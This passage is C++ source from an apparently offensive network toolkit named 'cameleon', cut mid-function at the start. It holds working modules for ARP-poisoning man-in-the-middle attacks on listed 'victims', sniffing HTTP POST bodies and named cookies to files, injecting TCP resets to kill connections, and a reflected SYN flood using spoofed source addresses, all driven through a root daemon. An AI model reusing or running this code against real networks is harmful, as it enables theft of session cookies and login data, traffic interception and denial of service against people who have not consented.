                    _modules[name] = new HttpPostSniffer(_iface, fd, filename, hostname);
            }
            else if (type == "all") // If Type ALL
                _modules[name] = new HttpPostSniffer(_iface, fd, filename);
            else
            {
                _rep << "Bad parameters." << std::endl << HttpPostSniffer::help() << std::endl;
                return ;
            }
            _modules[name]->start();
            _rep << "HttpPostSniffer started";
        }
        else
            _rep << "Module " << name << " already exist !";
    }
}

void Launcher::startHttpCookieSniffer(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator   it;
    std::string                                 name;
    std::string                                 filename;
    std::string                                 key;
    std::vector<std::string>                    vKeys;

    iss >> name;
    iss >> filename;
    iss >> key;
    if (!name.length())
        help(iss);
    else if (!filename.length() || !key.length())
        _rep << "Bad parameters." << std::endl << HttpCookieSniffer::help() << std::endl;
    else
    {
        // Push first key and then other keys (key = cookie name)
        vKeys.push_back(key);
        while (iss >> key)
            vKeys.push_back(key);

        it = _modules.find(name);
        if (it == _modules.end())
        {
            std::ofstream    *fd = new std::ofstream();

            fd->open(filename);
            _modules[name] = new HttpCookieSniffer(_iface, fd, filename, vKeys);
            _modules[name]->start();
            _rep << "HttpCookieSniffer started";
        }
        else
            _rep << "Module " << name << " already exist !";
    }
}

void Launcher::startMitm(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;
    std::string     gatewayIp;
    std::string     file;

    iss >> name;
    iss >> file;
    iss >> gatewayIp;
    if (!name.length())
        help(iss);
    else if (!gatewayIp.length() || !file.length())
        _rep << "Bad parameters." << std::endl << Mitm::help();
    else
    {
        std::ifstream               fd;
        std::vector<std::string>    victims;

        fd.open(file);
        int i = 0;
        for (std::string line; std::getline(fd, line) && i < 40;i++)
            victims.push_back(line);

        it = _modules.find(name);
        if (it == _modules.end())
        {
            _modules[name] = new Mitm(_iface, &_rep, victims, gatewayIp);
            _modules[name]->start();
        }
        else
            _rep << "Module " << name << " already exist !";
    }
}

void Launcher::startTcpKill(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;
    std::string     dstIp;
    std::string     srcIp;
    std::string     port;

    iss >> name;
    iss >> dstIp;
    iss >> srcIp;
    iss >> port;
    if (!name.length())
        help(iss);
    else if (!dstIp.length() || !port.length() || !srcIp.length())
        _rep << "Bad parameters." << std::endl << TcpKill::help();
    else
    {
        it = _modules.find(name);
        if (it == _modules.end())
        {
            if (dstIp == "0.0.0.0")
                _modules[name] = new TcpKill(_iface, &_rep, srcIp, port, true);
            else if (srcIp == "0.0.0.0")
                _modules[name] = new TcpKill(_iface, &_rep, dstIp, port);
            else
                _modules[name] = new TcpKill(_iface, &_rep, dstIp, srcIp, port);
            _modules[name]->start();
        }
        else
            _rep << "Module " << name << " already exist !";
    }
}












#include "Daemon.hh"

int main(void)
{
    if (getuid() != 0)
    {
        std::cout << "Must be root." << std::endl;
        return 1;
    }

    try
    {
        Daemon      d("/etc/cameleon/cameleon.sock", NetworkInterface::default_interface().name());

        d.start();
    }
    catch (std::runtime_error &e)
    {
        std::cout << e.what() << std::endl;
    }

    return 0;
}
#include "Mitm.hh"

Mitm::Mitm(const NetworkInterface &iface, std::ostream *out, const std::vector<std::string> &victimsIp, const std::string &gatewayIp)
    : AModule(iface, "Mitm", out), _run(false)
{
    HWAddress<6>    victimMac;

    _gateway.ip(IPv4Address(gatewayIp));
    _gateway.mac(arpRequest(_gateway.ip()));

    for (std::string victimIp : victimsIp)
    {
        victimMac = arpRequest(victimIp);

        _victims.push_back(victimIp);

        // Tell gateway thats _victim.ip() is _attackerMac (sender, sender, target, target)
        _poisonPackets.push_back(ARP::make_arp_reply(_gateway.ip(), victimIp, _gateway.mac(), _attacker.mac()));
        // Tell victim thats _gateway.ip() is _attackerMac
        _poisonPackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _attacker.mac()));
        // Tell victim thats _gateway.ip() is gatewayMac
        _basePackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _gateway.mac()));
        // Tell victim thats _gateway.ip() is gatewayMac
        _basePackets.push_back(ARP::make_arp_reply( _gateway.ip(), victimIp, _gateway.mac(), victimMac));
    }

    // Enable ip forwarding
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    *_out << "Start Mitm";
}

void Mitm::poison(void)
{
    // Start poisoning arp tables
    _run = true;
    while (_run)
    {
        for (EthernetII pkt : _poisonPackets)
            _sender.send(pkt, _iface);

        // Don't need to spam
        sleep(2);
    }
}

void Mitm::start(void)
{
    std::thread     t(&Mitm::poison, this);

    t.detach();
}

void Mitm::stop(void)
{
    _run = false;

    for (int i = 0; i < 2; i++)
    {
        for (EthernetII pkt : _basePackets)
            _sender.send(pkt, _iface);
    }
}

std::string Mitm::info(void) const
{
    std::stringstream   ss;

    for (IPv4Address ip : _victims)
        ss << "[" << ip << "]" << " <---> " << "[" << _gateway.ip() << "]";
    return ss.str();
}

std::string Mitm::help(void)
{
    std::string     rep;

    rep += "Start a global man in the middle attack by arp poisoning.\n";
    rep += "\tOptions : <ipFile> <gatewayIp>";
    return rep;
}

const HWAddress<6> Mitm::arpRequest(const IPv4Address &targetIp)
{
    EthernetII      arpReq = ARP::make_arp_request(targetIp, _attacker.ip(), _attacker.mac());
    PDU             *response;

    if ((response = _sender.send_recv(arpReq, _iface)))
        return response->rfind_pdu<ARP>().sender_hw_addr();

    throw std::runtime_error("Can't send_recv");
}

void Mitm::arpReply(const IPv4Address &senderIp, const HWAddress<6> &senderMac, const IPv4Address &targetIp, const HWAddress<6> &targetMac)
{
    EthernetII      rep = ARP::make_arp_reply(targetIp, senderIp, targetMac, senderMac);

    _sender.send(rep, _iface);
}
#include "ReflectedFlood.hh"

using namespace Tins;

ReflectedFlood::ReflectedFlood(const std::string &target) : _target(target)
{
}

void ReflectedFlood::addSpoof(const std::string &spoofedAdress, unsigned int port)
{
    _spoofList.push_back(Spoof(IPv4Address(spoofedAdress), port));
}

void ReflectedFlood::dumpAdress(void)
{
    std::cout << "Send from :" << std::endl;
    for (unsigned int i = 0; i < _spoofList.size(); i++)
        std::cout << _spoofList[i].first << ":" << _spoofList[i].second << std::endl;
}

void ReflectedFlood::flood(unsigned int count)
{
    NetworkInterface    iface = NetworkInterface::default_interface();
    NetworkInterface::Info  info = iface.addresses();
    std::vector<EthernetII>     packets;
    PacketSender        sender;
    EthernetII          eth = EthernetII("9c:97:26:e2:82:d6", info.hw_addr); //"ac:81:12:ba:55:bb");
    IP                  ip;
    TCP                 tcp;

    tcp.set_flag(TCP::SYN, 1);
    tcp.sport(54254);
    ip.src_addr(_target);

    // Create packet list with spoofed ip
    for (Spoof spoof : _spoofList)
    {
        ip.dst_addr(spoof.first);
        tcp.dport(spoof.second);
        packets.push_back(eth / ip / tcp);
    }

    std::cout << "Sending packets .." << std::endl;
    // Send each packets
    for (unsigned int i = 0; i < count; i++)
    {
        for (EthernetII packet : packets)
        {
            std::cout << packet.src_addr() << " -> " << packet.dst_addr() << std::endl;
            sender.send(packet, iface);
            sleep(1);
        }
    }

    std::cout << "done." << std::endl;
}

/*
    NetworkInterface        iface = NetworkInterface::default_interface();
    NetworkInterface::Info  info = iface.addresses();
    IPv4Address             ipBox("192.168.1.254");
    IPv4Address             ipEnzo("192.168.1.67");
    std::string             macBox("9c:97:26:e2:82:d6");

    EthernetII              eth = EthernetII(macBox, info.hw_addr) / IP(ipBox, info.ip_addr);
    TCP     tcp(80, 3321);

    tcp.set_flag(TCP::SYN, 1);
    eth /= tcp;
 */
#include "Sender.hh"

Sender::Sender(const std::string &path, const std::string &msg)
    : _local(path, DomainSocket::CLIENT), _run(false)
{
    if (_local.isRunning())
    {
        // Add first msg
        _local.addMsg(msg);
    }
}

void Sender::start(void)
{
    if (_local.isRunning())
    {
        _run = true;
        while (_run)
        {
            handleSockets();
        }
    }
}

int Sender::initSelect(timeval *tv, fd_set *readfds, fd_set *writefds)
{
    int     fd_max = _local.fd();

    // Timeout 100 ms
    tv->tv_sec = 0;
    tv->tv_usec = 100;

    // Initialize bits field for select
    FD_ZERO(readfds);
    FD_SET(_local.fd(), readfds);
    FD_SET(0, readfds);
    // Write
    FD_ZERO(writefds);
    FD_SET(_local.fd(), writefds);
    return fd_max + 1;
}

void Sender::handleSockets(void)
{
    fd_set              readfds;
    fd_set              writefds;
    int                 fd_max;
    struct timeval      tv;

    fd_max = initSelect(&tv, &readfds, &writefds);
    if (::select(fd_max, &readfds, NULL, NULL, &tv) == -1)
    {
        throw std::runtime_error(std::string("Select Error : ") + ::strerror(errno));
    }
    else
    {
        // If something to read on stdin
        if (FD_ISSET(0, &readfds))
            eventTerminal();
        // If something to read on socket
        if (FD_ISSET(_local.fd(), &readfds))
            eventSocketRead();
        if (FD_ISSET(_local.fd(), &writefds))
            eventSocketWrite();
    }
}

void Sender::eventTerminal(void)
{
    _run = false;
}

void Sender::eventSocketRead(void)
{
    std::string         msg;

    try
    {
        _local.recvMsg();
        msg = _local.getMsg();
        std::cout << msg << std::endl;
        _run = false;
    }
    catch (std::runtime_error &e)
    {
        std::cout << e.what() << std::endl;
    }
}

void Sender::eventSocketWrite(void)
{
    if (_local.somethingToSend())
    {
        try
        {
            _local.sendMsg();
        }
        catch (std::runtime_error &e)
        {
            std::cout << e.what() << std::endl;
        }
    }
}

int main(int ac, char **av)
{
    std::string     cmd;

    if (ac < 2)
    {
        std::cout << "  Usage : " << av[0] << " [commands]" << std::endl;
        return 1;
    }

    for (int i = 1; i < ac; i++)
    {
        cmd += av[i];
        cmd += " ";
    }

    try
    {
        Sender      s("/etc/cameleon/cameleon.sock", cmd);

        s.start();
    }
    catch (std::runtime_error &e)
    {
        std::cout << "  " << e.what() << std::endl;
    }

    return 0;
}
#include "TcpKill.hh"

TcpKill::TcpKill(const NetworkInterface &iface, std::ostream *out, std::string &dstIp, std::string &srcIp, std::string &port)
    : ASniffer(iface, "TcpKill", "tcp and dst port " + port + " and dst host " + dstIp + " and src host " + srcIp, out), _dstIp(dstIp), _srcIp(srcIp), _port(std::stoi(port)), _type(TcpKill::ServerToVictim)
{
    *_out << "TcpKill started for " << _dstIp << ":" << _port << " -> " << _srcIp;
}

TcpKill::TcpKill(const NetworkInterface &iface, std::ostream *out, std::string &dstIp, std::string &port)
    : ASniffer(iface, "TcpKill", "tcp and dst port " + port + " and dst host " + dstIp, out), _dstIp(dstIp), _srcIp("0.0.0.0"), _port(std::stoi(port)), _type(TcpKill::AllToServer)
{
    *_out << "TcpKill started for " << _dstIp << ":" << _port << " -> " << _srcIp;
}

TcpKill::TcpKill(const NetworkInterface &iface, std::ostream *out, std::string &srcIp, std::string &port, bool flag)
    : ASniffer(iface, "TcpKill", "tcp and dst port " + port + " and src host " + srcIp, out), _dstIp("0.0.0.0"), _srcIp(srcIp), _port(std::stoi(port)), _type(TcpKill::VictimToAll)
{
    (void)flag;
    *_out << "TcpKill started for " << _dstIp << ":" << _port << " -> " << _srcIp;
}

std::string TcpKill::info(void) const
{
    std::stringstream   ss;

    ss << "Kill traffic from " << _dstIp << ":" << _port << " -> " << _srcIp;
    return ss.str();
}

std::string TcpKill::help(void)
{
    return std::string("Start TcpKill.\n") + "\tOptions : <dstIp> <srcIp> <port>";
}

bool TcpKill::handler(PDU &pdu)
{
    // EthernetII / IP / TCP
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    TCP tcp = ip.rfind_pdu<TCP>();

    // It's a legitimate tcp packet on right port ? (Not a crafted)
    if (tcp.dport() == _port && tcp.get_flag(TCP::RST) == 0)
    {
        tcp.set_flag(TCP::RST, 1);
        tcp.set_flag(TCP::ACK, 0);
        tcp.set_flag(TCP::SYN, 0);

        // Build our packet
        EthernetII pkt = EthernetII(eth.dst_addr(), eth.src_addr()) /
                            IP(ip.dst_addr(), ip.src_addr()) / tcp;

        // Kill traffic only between Server and Victim
        if (_type == TcpKill::ServerToVictim && ip.dst_addr() == _dstIp && ip.src_addr() == _srcIp)
            _sender.send(pkt, _iface);
        else if (_type == TcpKill::AllToServer && ip.dst_addr() == _dstIp) // Kill all traffic from Server
            _sender.send(pkt, _iface);
        else if (_type == TcpKill::VictimToAll && ip.src_addr() == _srcIp) // Kill all traffic from Victim
            _sender.send(pkt, _iface);
    }
    return true;
}
